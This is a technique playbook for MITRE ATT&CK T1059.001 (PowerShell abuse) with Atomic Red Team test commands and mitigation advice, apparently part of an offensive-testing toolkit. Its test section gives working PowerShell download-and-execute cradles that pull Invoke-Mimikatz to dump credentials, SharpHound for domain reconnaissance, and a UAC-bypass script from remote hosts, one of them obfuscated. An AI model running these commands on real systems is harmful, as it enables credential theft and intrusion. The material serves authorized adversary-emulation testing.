---
name: "T1059.001_powershell"
description: "Adversaries may abuse PowerShell commands and scripts for execution."
category: "input-validation"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1059.001
  - execution
  - windows
  - sub-technique
technique_id: "T1059.001"
tactic: "execution"
all_tactics:
  - execution
platforms:
  - Windows
mitre_url: "https://attack.mitre.org/techniques/T1059/001"
tech_stack:
  - windows
cwe_ids:
  - CWE-94
chains_with:
  - T1059
  - T1059.002
  - T1059.003
  - T1059.004
  - T1059.005
  - T1059.006
  - T1059.007
  - T1059.008
  - T1059.009
  - T1059.010
  - T1059.011
  - T1059.012
  - T1059.013
prerequisites:
  - T1059
severity_boost:
  T1059: "Chain with T1059 for deeper attack path"
  T1059.002: "Chain with T1059.002 for deeper attack path"
  T1059.003: "Chain with T1059.003 for deeper attack path"
---

# T1059.001 PowerShell

> **Sub-technique of:** T1059

## High-Level Description

Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).

PowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.

A number of PowerShell-based offensive testing tools are available, including Empire, PowerSploit, PoshC2, and PSAttack.

PowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).

## Kill Chain Phase

- Execution (TA0002)

**Platforms:** Windows

## What to Check

- [ ] Identify if PowerShell technique is applicable to target environment
- [ ] Check Windows systems for indicators of PowerShell
- [ ] Verify mitigations are bypassed or absent (5 known mitigations)
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: Mimikatz

Download Mimikatz and dump credentials. Upon execution, mimikatz dump details and password hashes will be displayed.

**Supported Platforms:** windows
**Elevation Required:** Yes

```cmd
powershell.exe "IEX (New-Object Net.WebClient).DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds"
```

### Atomic Test 2: Run BloodHound from local disk

Upon execution SharpHound will be downloaded to disk, imported and executed. It will set up collection methods, run and then compress and store the data to the temp directory on the machine. If system is unable to contact a domain, proper execution will not occur.

Successful execution will produce stdout message stating "SharpHound Enumeration Completed". Upon completion, final output will be a *BloodHound.zip file.

**Supported Platforms:** windows

```powershell
import-module "PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1"
try { Invoke-BloodHound -OutputDirectory $env:Temp }
catch { $_; exit $_.Exception.HResult}
Start-Sleep 5
```

**Dependencies:**
- SharpHound.ps1 must be located at "PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1"

### Atomic Test 3: Run Bloodhound from Memory using Download Cradle

Upon execution SharpHound will load into memory and execute against a domain. It will set up collection methods, run and then compress and store the data to the temp directory. If system is unable to contact a domain, proper execution will not occur.

Successful execution will produce stdout message stating "SharpHound Enumeration Completed". Upon completion, final output will be a *BloodHound.zip file.

**Supported Platforms:** windows

```powershell
write-host "Remote download of SharpHound.ps1 into memory, followed by execution of the script" -ForegroundColor Cyan
IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1');
Invoke-BloodHound -OutputDirectory $env:Temp
Start-Sleep 5
```

### Atomic Test 4: Mimikatz - Cradlecraft PsSendKeys

Run mimikatz via PsSendKeys. Upon execution, automated actions will take place to open file explorer, open notepad and input code, then mimikatz dump info will be displayed.

**Supported Platforms:** windows
**Elevation Required:** Yes

```powershell
$url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object -ComObject WScript.Shell;$reg='HKCU:\Software\Microsoft\Notepad';$app='Notepad';$props=(Get-ItemProperty $reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{SP $reg (Item Variable:_).Value[0] (Variable _).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item Variable:_).Value.id-ieq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500};While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500};$wshell.SendKeys('^o');Start-Sleep -Milliseconds 500;@($url,(' '*1000),'~')|ForEach{$wshell.SendKeys((Variable _).Value)};$res=$Null;While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{$wshell.SendKeys((Item Variable:_).Value)};Start-Sleep -Milliseconds 500;$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%f','x')|ForEach{$wshell.SendKeys((Variable _).Value)};If(GPS|?{(Item Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Item Variable:_).Value)}};@('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{SP $reg (Item Variable:_).Value $props.((Variable _).Value)};IEX($res);invoke-mimikatz -dumpcr
```

### Atomic Test 5: Invoke-AppPathBypass

Note: Windows 10 only. Upon execution windows backup and restore window will be opened.

Bypass is based on: https://enigma0x3.net/2017/03/14/bypassing-uac-using-app-paths/

**Supported Platforms:** windows

```cmd
Powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\Windows\System32\cmd.exe'"
```


### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to PowerShell by examining the target platforms (Windows).

2. **Assess Existing Defenses**: Review whether mitigations for T1059.001 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

### M1042 Disable or Remove Feature or Program
It may be possible to remove PowerShell from systems when not needed, but a review should be performed to assess the impact to an environment, since it could be in use for many legitimate purposes and administrative functions.

Disable/restrict the WinRM Service to help prevent uses of PowerShell for remote execution.

### M1049 Antivirus/Antimalware
Anti-virus can be used to automatically quarantine suspicious files.

### M1045 Code Signing
Set PowerShell execution policy to execute only signed scripts.

### M1026 Privileged Account Management
When PowerShell is necessary, consider restricting PowerShell execution policy to administrators. Be aware that there are methods of bypassing the PowerShell execution policy, depending on environment configuration.

PowerShell JEA (Just Enough Administration) may also be used to sandbox administration and limit what commands admins/users can execute through remote PowerShell sessions.

### M1038 Execution Prevention
Use application control where appropriate. PowerShell Constrained Language mode can be used to restrict access to sensitive or otherwise dangerous language elements such as those used to execute arbitrary Windows APIs or files (e.g., `Add-Type`).


## Detection

### Abuse of PowerShell for Arbitrary Execution


## Risk Assessment

| Finding | Severity | Impact |
| ------- | -------- | ------ |
| PowerShell technique applicable | Medium | Execution |

## CWE Categories

| CWE ID | Title |
| ------ | ----- |
| CWE-94 | Improper Control of Generation of Code |


## References

- [Microsoft PSfromCsharp APR 2014](https://blogs.msdn.microsoft.com/kebab/2014/04/28/executing-powershell-scripts-from-c/)
- [SilentBreak Offensive PS Dec 2015](https://web.archive.org/web/20190508170150/https://silentbreaksecurity.com/powershell-jobs-without-powershell-exe/)
- [FireEye PowerShell Logging 2016](https://www.fireeye.com/blog/threat-research/2016/02/greater_visibilityt.html)
- [Github PSAttack](https://github.com/Exploit-install/PSAttack-1)
- [inv_ps_attacks](https://powershellmagazine.com/2014/07/16/investigating-powershell-attacks/)
- [Malware Archaeology PowerShell Cheat Sheet](http://www.malwarearchaeology.com/s/Windows-PowerShell-Logging-Cheat-Sheet-ver-June-2016-v2.pdf)
- [TechNet PowerShell](https://technet.microsoft.com/en-us/scriptcenter/dd742419.aspx)
- [Sixdub PowerPick Jan 2016](https://web.archive.org/web/20160327101330/http://www.sixdub.net/?p=367)
- [Atomic Red Team - T1059.001](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1059.001)
- [MITRE ATT&CK - T1059.001](https://attack.mitre.org/techniques/T1059/001)
